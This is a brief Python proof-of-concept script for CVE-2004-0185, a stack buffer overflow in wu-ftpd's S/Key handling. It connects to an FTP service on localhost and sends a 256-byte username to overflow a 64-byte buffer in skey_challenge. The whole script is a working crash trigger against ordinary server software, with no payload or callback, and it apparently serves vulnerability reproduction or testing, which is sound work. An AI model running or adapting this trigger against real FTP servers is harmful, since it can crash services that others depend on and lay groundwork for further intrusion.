#!/usr/bin/env python3
"""
PoC: CVE-2004-0185 - wu-ftpd S/Key Buffer Overflow
Trigger: Long username causes stack buffer overflow in skey_challenge function
"""

import socket

s = socket.socket()
s.connect(("localhost", 2125))
s.recv(1024)  # banner

# CVE-2004-0185: skey_challenge uses fixed 64-byte buffer for username
# Sending >64 byte username overflows the stack buffer
long_user = b"A" * 256
s.send(b"USER " + long_user + b"\r\n")
s.recv(1024)
s.close()
